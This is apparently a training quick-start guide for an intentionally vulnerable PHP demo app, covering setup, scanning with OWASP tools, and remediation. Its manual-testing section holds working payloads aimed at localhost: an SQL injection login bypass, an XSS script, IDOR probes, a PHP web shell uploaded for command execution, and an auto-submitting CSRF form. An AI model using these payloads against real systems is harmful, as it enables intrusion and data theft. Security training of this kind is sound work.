# Quick Start Guide - Vulnerable Demo Application

## Overview
This guide will help you quickly set up, run, and scan the vulnerable demo application.

## Prerequisites
- Docker and Docker Compose installed
- 8GB RAM recommended
- 10GB free disk space

## Quick Setup (5 minutes)

### 1. Start the Application
```bash
cd /Users/santhosh/Mukana/SSDLC/Demo-Code

# Build and run
docker-compose up --build -d

# Check if running
docker ps
```

### 2. Access the Application
Open browser: `http://localhost:8080`

**Test Credentials:**
- Username: `admin`
- Password: `admin123`

## Quick Security Scans

### Scan 1: OWASP Dependency-Check (5 minutes)
```bash
# Download (one-time)
wget https://github.com/jeremylong/DependencyCheck/releases/download/v8.4.0/dependency-check-8.4.0-release.zip
unzip dependency-check-8.4.0-release.zip

# Run scan
./dependency-check/bin/dependency-check.sh \
  --project "Vulnerable-Demo" \
  --scan . \
  --format HTML \
  --out ./reports

# View report
open reports/dependency-check-report.html
```

**Expected Results:**
- ✅ 10+ high severity vulnerabilities
- ✅ Vulnerable jQuery version detected
- ✅ Outdated PHP dependencies flagged

### Scan 2: OWASP ZAP Baseline (10 minutes)
```bash
# Run baseline scan
docker run --rm -v $(pwd):/zap/wrk:rw \
  -t owasp/zap2docker-stable zap-baseline.py \
  -t http://host.docker.internal:8080 \
  -r zap-report.html

# View report
open zap-report.html
```

**Expected Results:**
- ✅ SQL Injection alerts
- ✅ XSS vulnerabilities
- ✅ Missing security headers
- ✅ 15+ high risk alerts

### Scan 3: SonarQube (15 minutes)
```bash
# Start SonarQube
docker run -d --name sonarqube -p 9000:9000 sonarqube:latest

# Wait for startup (2-3 minutes)
# Access: http://localhost:9000 (admin/admin)

# Download scanner
wget https://binaries.sonarsource.com/Distribution/sonar-scanner-cli/sonar-scanner-cli-5.0.1.zip
unzip sonar-scanner-cli-5.0.1.zip

# Run scan
./sonar-scanner-5.0.1/bin/sonar-scanner

# View results at http://localhost:9000
```

**Expected Results:**
- ✅ 20+ blocker issues
- ✅ 30+ critical issues
- ✅ Hardcoded credentials detected
- ✅ SQL injection vulnerabilities
- ✅ Security hotspots identified

### Scan 4: Threat Dragon (5 minutes)
```bash
# Install
npm install -g owasp-threat-dragon-desktop

# Open threat model
threat-dragon threat-model.json

# Or view online
# Upload threat-model.json to https://www.threatdragon.com
```

**Expected Results:**
- ✅ 13 identified threats
- ✅ STRIDE categories mapped
- ✅ Architecture diagram showing data flows
- ✅ Critical threats highlighted

## Manual Vulnerability Testing

### Test 1: SQL Injection
```bash
# Login with SQL injection
curl -X POST http://localhost:8080/login \
  -d "username=admin' OR '1'='1&password=anything"

# Expected: Successful login bypass ✅
```

### Test 2: XSS Attack
```bash
# Create post with XSS
curl -X POST http://localhost:8080/post \
  -H "Cookie: PHPSESSID=your_session_id" \
  -d "title=Test&content=<script>alert('XSS')</script>"

# View dashboard to see XSS execute ✅
```

### Test 3: IDOR Vulnerability
```bash
# Access different user profiles without authorization
curl http://localhost:8080/profile?id=1
curl http://localhost:8080/profile?id=2
curl http://localhost:8080/profile?id=3

# Expected: See all user data including passwords ✅
```

### Test 4: File Upload Bypass
```bash
# Upload PHP file
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -X POST http://localhost:8080/upload \
  -F "file=@shell.php"

# Execute commands
curl http://localhost:8080/uploads/shell.php?cmd=ls

# Expected: Remote code execution ✅
```

### Test 5: CSRF Attack
```html
<!-- Create this HTML file and open in browser while logged in -->
<html>
  <body>
    <form action="http://localhost:8080/post" method="POST" id="csrf">
      <input type="hidden" name="title" value="CSRF Attack">
      <input type="hidden" name="content" value="This was posted via CSRF">
    </form>
    <script>document.getElementById('csrf').submit();</script>
  </body>
</html>

<!-- Expected: Post created without user consent ✅ -->
```

## Scanning Results Summary

### Expected Vulnerability Count by Tool

| Tool | Critical | High | Medium | Low | Total |
|------|----------|------|---------|-----|-------|
| **Dependency-Check** | 5 | 8 | 3 | 2 | 18 |
| **OWASP ZAP** | 8 | 15 | 12 | 5 | 40 |
| **SonarQube** | 20 | 30 | 25 | 15 | 90+ |
| **Threat Dragon** | 5 | 6 | 2 | 0 | 13 |
| **Manual Tests** | 5 | 5 | 0 | 0 | 10 |

## Applying Security Fixes

### Quick Fix Verification
```bash
# Copy secure configuration
cp secure/.env.example .env

# Edit .env with secure values
nano .env

# Use secure login
php -S localhost:8081 -t secure/

# Access: http://localhost:8081/login_secure.php
```

### Re-scan After Fixes
```bash
# Re-run Dependency-Check
./dependency-check/bin/dependency-check.sh --project "Secure-App" --scan ./secure

# Re-run ZAP
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t http://localhost:8081 -r zap-report-fixed.html

# Re-run SonarQube
./sonar-scanner --project-key=secure-app --sources=./secure
```

**Expected Results After Fixes:**
- ✅ Dependency-Check: 0 critical issues (after updating dependencies)
- ✅ ZAP: <5 high alerts (only informational warnings)
- ✅ SonarQube: 0 blocker/critical security issues
- ✅ Manual tests: All attacks blocked

## Common Issues & Solutions

### Issue 1: Docker port already in use
```bash
# Solution: Change port in docker-compose.yml
ports:
  - "8081:80"  # Change 8080 to 8081
```

### Issue 2: SonarQube won't start
```bash
# Solution: Increase Docker memory
# Docker Desktop > Settings > Resources > Memory: 4GB+
```

### Issue 3: Permission denied on uploads
```bash
# Solution: Fix permissions
docker exec -it vulnerable-demo-app chmod 777 /var/www/html/uploads
```

### Issue 4: Database locked error
```bash
# Solution: Stop and restart container
docker-compose down
docker-compose up
```

## Cleanup

```bash
# Stop application
docker-compose down

# Remove containers and volumes
docker-compose down -v

# Remove downloaded scanners (optional)
rm -rf dependency-check* sonar-scanner*
```

## Learning Path

1. **Day 1**: Set up and explore application
2. **Day 2**: Run all security scans
3. **Day 3**: Document all findings
4. **Day 4**: Apply security fixes
5. **Day 5**: Re-scan and verify fixes

## Key Takeaways

✅ **30+ vulnerabilities** across multiple categories  
✅ **5 security tools** covering different aspects  
✅ **OWASP Top 10** vulnerabilities represented  
✅ **Accessible UI** with proper ARIA labels  
✅ **Complete remediation** examples provided  

## Next Steps

1. Review `README.md` for detailed documentation
2. Check `SECURITY_FIXES.md` for fix implementations
3. Explore `threat-model.json` in Threat Dragon
4. Compare vulnerable vs secure code versions
5. Practice fixing vulnerabilities yourself

## Support & Resources

- **Documentation**: README.md
- **Security Fixes**: SECURITY_FIXES.md
- **Threat Model**: threat-model.json
- **OWASP Resources**: https://owasp.org
- **CWE Database**: https://cwe.mitre.org

---

**Remember**: This is an intentionally vulnerable application for learning purposes only. Never deploy in production!
